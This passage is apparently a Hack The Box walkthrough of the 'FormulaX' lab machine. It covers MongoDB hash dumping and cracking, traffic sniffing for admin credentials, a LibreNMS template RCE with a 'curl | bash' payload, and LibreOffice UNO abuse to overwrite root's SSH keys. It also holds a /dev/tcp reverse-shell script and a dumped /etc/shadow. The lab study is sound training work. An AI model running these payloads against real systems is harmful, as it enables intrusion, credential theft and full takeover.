> show databases;
admin    0.000GB
config   0.000GB
local    0.000GB
testing  0.000GB
```

```
> use admin;
switched to db admin
```

```c
> use testing;
switched to db testing
```

```c
> show tables;
messages
users
```

```c
> db.users.find();
{ "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MTAwMTgxMDd9.iOyWNYwN53sx24G7-_YuPu5F-3cvU6CO6m-yTUPdqEY", "__v" : 0 }
{ "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }
```

### Cracking the Hash

By using `John the Ripper` or `hashcat` we were able to `crack` the `hash` of `frank_dorky`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/files]
└─$ cat hash 
$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/files]
└─$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:00:23 DONE (2024-03-09 15:53) 0.04219g/s 118.4p/s 118.4c/s 118.4C/s catcat..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Username   | Password         |
| ---------- | ---------------- |
| frank_doky | manchesterunited |

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/files]
└─$ ssh frank_dorky@10.129.248.196
The authenticity of host '10.129.248.196 (10.129.248.196)' can't be established.
ED25519 key fingerprint is SHA256:e0esz1Aos6gxct2ci4LGbCAR6i31EoktxFIvCFF+rcM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.248.196' (ED25519) to the list of known hosts.
frank_dorky@10.129.248.196's password:
```

## user.txt

The account of `frank_dorky` gave us access to the `user.txt`.

```c
frank_dorky@formulax:~$ ls -la
total 40
drwxr-x--- 6 frank_dorky frank_dorky 4096 Feb 19 21:20 .
drwxr-xr-x 4 root        root        4096 Jun 18  2023 ..
lrwxrwxrwx 1 frank_dorky frank_dorky    9 Jun 19  2023 .bash_history -> /dev/null
-rw-r--r-- 1 frank_dorky frank_dorky  220 Jun 18  2023 .bash_logout
-rw-r--r-- 1 frank_dorky frank_dorky 3771 Jun 18  2023 .bashrc
drwx------ 2 frank_dorky frank_dorky 4096 Jun 18  2023 .cache
drwx------ 3 frank_dorky frank_dorky 4096 Jun 20  2023 .gnupg
drwxrwxr-x 3 frank_dorky frank_dorky 4096 Jun 19  2023 .local
-rw-r--r-- 1 frank_dorky frank_dorky  807 Jun 18  2023 .profile
drwxr-xr-x 2 frank_dorky frank_dorky 4096 Mar  5 15:43 .ssh
-rw-r--r-- 1 root        frank_dorky   33 Mar  9 19:01 user.txt
```

```c
frank_dorky@formulax:~$ cat user.txt
84a35f16e7e86e65377b161fef410ff5
```

## Pivoting

Unfortunately `frank_dorky` was not able to execute `sudo` on the box but we already knew about `kai_relay` so we assumed to `privesc` again.

```c
frank_dorky@formulax:~$ sudo -l
[sudo] password for frank_dorky: 
Sorry, user frank_dorky may not run sudo on forumlax.
```

## Privilege Escalation to admin

As mentioned at the beginning of the box, for the next part was `SNMP` involved because on local port `3000/TCP` we found a application running called `librenms`. The application made use of `snmp-trap` and was vulnerable to `Remote Code Execution (RCE)`.

- [https://www.sonarsource.com/blog/it-s-a-snmp-trap-gaining-code-execution-on-librenms/](https://www.sonarsource.com/blog/it-s-a-snmp-trap-gaining-code-execution-on-librenms/)

We forwarded port `3000/TCP` and accessed it with the credentials of `frank_dorky`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ ssh -L 3000:127.0.0.1:3000 frank_dorky@10.129.248.196
frank_dorky@10.129.248.196's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Mar  9 20:51:02 2024 from 10.10.16.11
frank_dorky@formulax:~$
```

- [http://127.0.0.1:3000/login](http://127.0.0.1:3000/login)

![](images/2024-03-09_16-06_librenms_login.png)

![](images/2024-03-09_16-06_librenms_dashboard.png)

One of our `artificial intelligent` members provided us a smart `script` to sniff traffic on port `3000/TCP` on the box.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/files]
└─$ cat sniff.py 
import socket
import struct

def is_http_packet(tcp_packet):
    """
    Check if the TCP packet is likely an HTTP packet on port 3000.
    """
    # TCP header is at least 20 bytes long. Extract the destination port from it.
    # TCP destination port is located from byte 2 to 4 in the TCP header.
    tcp_header = tcp_packet[:20]
    src_port, dest_port = struct.unpack('!HH', tcp_header[0:4])[0:2]

    # Check if the destination port is 3000
    return dest_port == 3000

def main():
    # Specify the file to save HTTP traffic
    http_traffic_file_path = "http_traffic_port_3000.bin"

    # Create a raw socket
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    except socket.error as msg:
        print(f'Socket could not be created. Error Code : {msg[0]} Message {msg[1]}')
        return

    print("Capturing HTTP packets on port 3000. Press Ctrl+C to stop.")

    with open(http_traffic_file_path, "wb") as http_traffic_file:
        try:
            # Capture packets indefinitely
            while True:
                packet, addr = s.recvfrom(65565)
                # Parse the packet to check if it's an IP packet containing TCP data destined for port 3000
                eth_header = packet[:14]
                eth_protocol = struct.unpack("!H", eth_header[12:])[0]

                if eth_protocol == 0x0800:  # IP packet
                    ip_header = packet[14:34]  # Assuming no IP options, the header is 20 bytes
                    ip_header_length = (ip_header[0] & 0x0F) * 4
                    protocol = ip_header[9]

                    if protocol == 6:  # TCP protocol
                        tcp_header_start = 14 + ip_header_length
                        tcp_header = packet[tcp_header_start:tcp_header_start+20]  # Assuming no TCP options

                        if is_http_packet(tcp_header):
                            print("HTTP packet on port 3000 captured")
                            # Write the entire packet to file
                            http_traffic_file.write(packet)
                            http_traffic_file.flush()
        except KeyboardInterrupt:
            print("Stopped HTTP packet capture on port 3000.")

if __name__ == '__main__':
    main()
```

We transferred the script to the box and after a minute we got a few hits incoming.

```c
frank_dorky@formulax:~$ python3 sniff.py 
Capturing HTTP packets on port 3000. Press Ctrl+C to stop.
```

```c
frank_dorky@formulax:~$ python3 sniff.py 
Capturing HTTP packets on port 3000. Press Ctrl+C to stop.
HTTP packet on port 3000 captured
HTTP packet on port 3000 captured
HTTP packet on port 3000 captured
<--- CUT FOR BREVITY --->
HTTP packet on port 3000 captured
HTTP packet on port 3000 captured
HTTP packet on port 3000 captured
^CStopped HTTP packet capture on port 3000.
```

The simplest way to extract information of the binary was to grep for `admin` while using `strings` against it.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/files]
└─$ strings http_traffic_port_3000.bin | grep -i admin
_token=okLY6qvdmjFBoA1AatbN6JgrGfyQZETbAhWVJNje&username=admin&password=4JdNb%2B%3Bf%3DvP%3AJAD&submit=
_token=okLY6qvdmjFBoA1AatbN6JgrGfyQZETbAhWVJNje&username=admin&password=4JdNb%2B%3Bf%3DvP%3AJAD&submit=
```

We decoded the `URL encoded` part and got the password for `admin`.

![](images/2024-03-10_13-08_url_decoding.png)

| Username | Password        |
| -------- | --------------- |
| admin    | 4JdNb+;f=vP:JAD |

## Privilege Escalation to librenms

With the newly found credentials we were able to made use out of `malicious templates` aka `Remote Code Execution (RCE)` within `librenms`.

- [https://huntr.com/bounties/0c24bb60-4a8f-454f-9534-ba21b7470b55/](https://huntr.com/bounties/0c24bb60-4a8f-454f-9534-ba21b7470b55/)

![](images/2024-03-09_16-06_librenms_login_amdin_kai_relay.png)

First we added `librenms.com` to our `/etc/hosts` file on port `127.0.0.1` and accessed the page again to make sure that it worked properly.

- [http://librenms.com:3000/templates](http://librenms.com:3000/templates)

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.248.196  dev-git-auto-update.chatbot.htb
127.0.0.1       librenms.com
```

Then we `edited` an existing `template` and entered the following payload.

```c
@php
system("curl 10.10.16.11/x | bash");
@endphp
```

![](images/2024-03-09_16-06_librenms_reverse_shell.png)

We recycled our payload from before and after clicking on `Update Template` we instantly got our callback.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ nc -lnvp 9000
listening on [any] 9000 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.248.196] 58204
bash: cannot set terminal process group (996): Inappropriate ioctl for device
bash: no job control in this shell
librenms@formulax:~$ id
id
uid=999(librenms) gid=999(librenms) groups=999(librenms)
librenms@formulax:~$
```

## Privilege Escalation to kai_relay

By simply checking the `environment variables` we found another `password` which matched for `kai_relay`.

```c
librenms@formulax:~$ env
env
DB_PASSWORD=mychemicalformulaX
PWD=/opt/librenms
NODE_ID=648b260eb18d2
HOME=/opt/librenms
APP_KEY=base64:jRoDTOFGZEO08+68w7EzYPp8a7KZCNk+4Fhh97lnCEk=
DB_USERNAME=kai_relay
DB_HOST=localhost
USER=librenms
SHLVL=3
VAPID_PRIVATE_KEY=chr9zlPVQT8NsYgDGeVFda-AiD0UWIY6OW-jStiwmTQ
DB_DATABASE=librenms
VAPID_PUBLIC_KEY=BDhe6thQfwA7elEUvyMPh9CEtrWZM1ySaMMIaB10DsIhGeQ8Iks8kL6uLtjMsHe61-ZCC6f6XgPVt7O6liSqpvg
_=/usr/bin/env
```

| Password           |
| ------------------ |
| mychemicalformulaX |

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ ssh kai_relay@10.129.248.196
kai_relay@10.129.248.196's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kai_relay@formulax:~$
```

## Pivoting

The user `kai_relay` was able to execute a `script` on the box using `sudo` which opened a so called `UNO bridge` on port `2002/TCP` to connect to `LibreOffice` in `headless` mode.

- [https://ask.libreoffice.org/t/uno-choosing-between-running-office-instances/43318](https://ask.libreoffice.org/t/uno-choosing-between-running-office-instances/43318)

```c
kai_relay@formulax:~$ id
uid=1001(kai_relay) gid=1001(kai_relay) groups=1001(kai_relay),27(sudo),999(librenms)
```

```c
kai_relay@formulax:~$ sudo -l
Matching Defaults entries for kai_relay on forumlax:
    env_reset, timestamp_timeout=0, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_reset, timestamp_timeout=0

User kai_relay may run the following commands on forumlax:
    (ALL) NOPASSWD: /usr/bin/office.sh
```

```c
kai_relay@formulax:~$ cat /usr/bin/office.sh 
#!/bin/bash
/usr/bin/soffice --calc --accept="socket,host=localhost,port=2002;urp;" --norestore --nologo --nodefault --headless
```

## Privilege Escalation to root

We executed the script using `sudo` on one terminal and let it run to make sure the port was open.

- [https://github.security.telekom.com/2023/07/libre-office-calc-formula-parsing-vulnerability.html](https://github.security.telekom.com/2023/07/libre-office-calc-formula-parsing-vulnerability.html)

```c
kai_relay@formulax:~$ sudo /usr/bin/office.sh
```

After our `artificial intelligence` colleague pulled another awesome script out of his cylinder, we copied it to the box and ran it.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ cat root.py 
import uno
from com.sun.star.connection import NoConnectException
from com.sun.star.beans import PropertyValue

def load_file_as_csv(file_path, output_pdf_path):
    """Loads a text file into LibreOffice Calc as CSV and saves as PDF."""
    # Replace localhost with the appropriate host if LibreOffice is running on a different machine
    connection_string = "uno:socket,host=localhost,port=2002;urp;StarOffice.ComponentContext"
    try:
        local_context = uno.getComponentContext()
        resolver = local_context.ServiceManager.createInstanceWithContext("com.sun.star.bridge.UnoUrlResolver", local_context)
        context = resolver.resolve(connection_string)
        smgr = context.ServiceManager
        desktop = smgr.createInstanceWithContext("com.sun.star.frame.Desktop", context)

        # Define properties for loading the file. The FilterOptions string can be adjusted based on the file's specifics.
        # For CSV, you might need to specify the delimiter, text qualifier, character set, etc.
        load_props = (
            PropertyValue("FilterName", 0, "Text - txt - csv (StarCalc)", 0),
            PropertyValue("FilterOptions", 0, "44,34,0,1", 0),  # Adjust based on your file's format
        )
        document = desktop.loadComponentFromURL("file://"+file_path, "_blank", 0, load_props)

        # Specify PDF export properties
        pdf_export_props = (PropertyValue("FilterName", 0, "calc_pdf_Export", 0),)
        document.storeToURL("file://"+output_pdf_path, pdf_export_props)
        document.dispose()  # Close the document
        print(f"Document loaded as CSV and saved as PDF to {output_pdf_path}")
    except NoConnectException:
        print("Failed to connect to LibreOffice on port 2002. Ensure it's running and listening on the specified port.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    file_path = "/root/root.txt"  # File to load, ensure you have permission to access it
    output_pdf_path = "/tmp/output_document.pdf"  # Output PDF path
    load_file_as_csv(file_path, output_pdf_path)
```

```c
kai_relay@formulax:~$ python3 root.py 
Document loaded as CSV and saved as PDF to /tmp/output_document.pdf
```

## root.txt

It read `/root/root.txt` and exported it as `PDF` to `/tmp`, which then we downloaded and opened it locally to receive the `root.txt`.

```c
ac4e40b23defefaa403416266eac7eb5
```

![](images/2024-03-09_17-36_root_txt.png)

## Post Exploitation

Since this is never enough, we also read `/etc/shadow` and `Crow` even went a step further and pulled a `shell` as `root`. Good stuff indeed!

```c
root:$y$j9T$/lSSkn2dpkUFYRVCTUSn5.$XhIP3.CfCv2pusU6c4TPVgRsCedfulJNgnBbPfWXLO8:19752:0:99999:7:::
daemon:*:19405:0:99999:7:::
bin:*:19405:0:99999:7:::
sys:*:19405:0:99999:7:::
sync:*:19405:0:99999:7:::
games:*:19405:0:99999:7:::
man:*:19405:0:99999:7:::
lp:*:19405:0:99999:7:::
mail:*:19405:0:99999:7:::
news:*:19405:0:99999:7:::
uucp:*:19405:0:99999:7:::
proxy:*:19405:0:99999:7:::
www-data:*:19405:0:99999:7:::
backup:*:19405:0:99999:7:::
list:*:19405:0:99999:7:::
irc:*:19405:0:99999:7:::
gnats:*:19405:0:99999:7:::
nobody:*:19405:0:99999:7:::
_apt:*:19405:0:99999:7:::
systemd-network:*:19405:0:99999:7:::
systemd-resolve:*:19405:0:99999:7:::
messagebus:*:19405:0:99999:7:::
systemd-timesync:*:19405:0:99999:7:::
pollinate:*:19405:0:99999:7:::
sshd:*:19405:0:99999:7:::
usbmux:*:19515:0:99999:7:::
mongodb:*:19515:0:99999:7:::
snapd-range-524288-root:!:19516::::::
snap_daemon:!:19516::::::
mysql:!:19523:0:99999:7:::
Debian-snmp:!:19523:0:99999:7:::
librenms:$y$j9T$a6ohQusJVAmNjlckw53IW.$nU2wJkIRb3bFK9apCdGWMG3ZMcBAujBdpQXl2rUbh53:19523::::::
tcpdump:*:19524:0:99999:7:::
kai_relay:$y$j9T$tOkGbctwaNrLGuhDtJz/k0$1UiJF6TE5k9sh0uEGM3s7Emp/TEAQNmQXfaisdNnuH2:19607:0:99999:7:
frank_dorky:$y$j9T$lhs.tsQJeDgpGhN7IBjaa1$eND3/hQVaoF27lyz28/TGQTsCcEnHO0eoOXwt4LCME.:19607:0:99999:7
_laurel:!:19773::::::
```

### Get a shell as root

As mentioned, `Crow` looked into how to get a shell on the system as root and provide the following steps and modified script.

- [https://stackoverflow.com/questions/29507312/libre-office-uno-api-save-as-xls](https://stackoverflow.com/questions/29507312/libre-office-uno-api-save-as-xls)

We could read the flag by changing the variables to:

```c
inputFile = 'file:///root/root.txt'
outputFile = 'file:///tmp/flag.txt'
```

We saw the output had a `"` the beginning or at the end, maybe because it is a comma-separated values in the `.csv` file.

We created a `authorized_keys` file in `/tmp` with `"` at the top and bottom line to but the `public key` between.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ cat root_shell.py 
import uno
from com.sun.star.beans import PropertyValue

def _toProperties(**args):
    props = []
    for key in args:
        prop = PropertyValue()
        prop.Name = key
        prop.Value = args[key]
        props.append(prop)
    return tuple(props)

inputFile = 'file:///tmp/authorized_keys'
outputFile = 'file:///root/.ssh/authorized_keys'

# import the OpenOffice component context
local = uno.getComponentContext()
# access the UnoUrlResolver service - this will allow to connect to OpenOffice.org program
resolver = local.ServiceManager.createInstanceWithContext("com.sun.star.bridge.UnoUrlResolver", local)
# load the context and you are now connected - you can access OpenOffice via its API mechanism
context = resolver.resolve("uno:socket,host=localhost,port=2002;urp;StarOffice.ServiceManager")
remoteContext = context.getPropertyValue("DefaultContext")

# service responsible for the current document called desktop
desktop = context.createInstanceWithContext("com.sun.star.frame.Desktop", remoteContext)
document = desktop.getCurrentComponent()

# load, calculateAll(), save
load_props = (
    PropertyValue("FilterName", 0, "Text - txt - csv (StarCalc)", 0),
    PropertyValue("FilterOptions", 0, "44,34,0,1", 0),  # Adjust based on your file's format
)
document = desktop.loadComponentFromURL(inputFile, "_blank", 0, load_props)

# csv
document.storeToURL(outputFile, _toProperties(FilterName="Text - txt - csv (StarCalc)"))

document.dispose()
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/FormulaX/serve]
└─$ cat authorized_keys 
"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDAiZ0BuXmspO/KEZqHsGB6jfgR9MxK9uRqSInr+uEitc/Qgg6UjMx7acdim1oMazprDLSHnYGf/SCA8C2/G6sEwTmMzRVlLc0BY4nOa01oi7j1AUDZPu1O8tbPLZSTaxaTPeKLlVjmp6isdiwvFcIvcvfo9TvKUK4S5QXnIPAdEv/B+glmiOsZS8QZiPpkSlhvoW1zXkfSemwDrhyiFt44UgV92ji3du52yck1AJ6/XIBs/jODUod/wZdjsxLTSv4AhyplLQno68rNU7+fXduO6jnaJQ9ijz8B9KHSdzvn67NWiqZoJoUKJvUnuHtjP5IiXlvfu+VkhtKnR1tEiJUD5iCvfodvAvWmO4QTUgVX8YNY4wWJCs4Pwxg8N64bdsGxdkK4FwcBSMt/K1nkGxUXDEtX1pZpd1UFJJmxycVJCRu9cdr/tBl89/Bx3iYlfaPdr8cgZO5kC8I/r9KPI/hkPQk19JLg4+A/w4hysGGyHM4NZRUVmRHzlJMfdkXKjywHHMAEhthmPmAU84LLbl74BlRoj4cY245QviCIx9JbPtREbn/y1QIbPkExzqaOZbt9W4X8vuFybj5qqHb0P8DXGon91ISIhyuGB52B3XW6IoogYtYdS4HvCJmPjitfPwHWkNTqdZzOfMIAfYIuwwZkxp6Ha8S2xNrpf0hHYM5syQ==
"
```

```c
kai_relay@formulax:/tmp$ wget http://10.10.16.11/authorized_keys
--2024-03-10 06:44:45--  http://10.10.16.11/authorized_keys
Connecting to 10.10.16.11:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 729 [application/octet-stream]
Saving to: ‘authorized_keys’

authorized_keys                                            100%[========================================================================================================================================>]     729  --.-KB/s    in 0s      

2024-03-10 06:44:45 (125 MB/s) - ‘authorized_keys’ saved [729/729]
```

```c
kai_relay@formulax:/tmp$ wget http://10.10.16.11/root_shell.py
--2024-03-10 06:45:14--  http://10.10.16.11/root_shell.py
Connecting to 10.10.16.11:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1465 (1.4K) [text/x-python]
Saving to: ‘root_shell.py’

root_shell.py                                              100%[========================================================================================================================================>]   1.43K  --.-KB/s    in 0.01s   

2024-03-10 06:45:14 (106 KB/s) - ‘root_shell.py’ saved [1465/1465]
```

```c
kai_relay@formulax:/tmp$ python3 root_shell.py
```

```c
┌──(kali㉿kali)-[~]
└─$ ssh root@10.129.248.225
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Mar  5 15:43:14 2024 from 10.10.14.41
root@formulax:~#
```

This works because the character `"` already exists in the `input file` (/tmp/authorized_keys) and is therefore not added again. 

Furthermore, pointless characters in a line for or after the public key are ignored by SSH. At least according to our understanding.

# Run commands as root via SystemShellExecuteFlags
## 1. Make the file /tmp/shell.sh and give it executed rights.
```
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.31/1234 0>&1"
```
## 2. Run the script.
```python
import uno
from com.sun.star.system import XSystemShellExecute

host = '127.0.0.1'
port = '2002'

# Define the UNO component
localContext = uno.getComponentContext()

# Define the resolver to use, this is used to connect with the API
resolver = localContext.ServiceManager.createInstanceWithContext(
"com.sun.star.bridge.UnoUrlResolver", localContext )

# Connect with the provided host on the provided target port
print("[+] Connecting to target...")
context = resolver.resolve(
"uno:socket,host={0},port={1};urp;StarOffice.ComponentContext".format(host,port))

# Run commands
service_manager = context.ServiceManager
print(f"[+] Connected to {host}:{port}")
shell_execute = service_manager.createInstance("com.sun.star.system.SystemShellExecute")
# shell_execute.execute('file','arg',0)
# shell_execute.execute('touch','/tmp/pwn',0)
shell_execute.execute('/tmp/out/shell.sh','',0)
print("[+] Command executed")
```

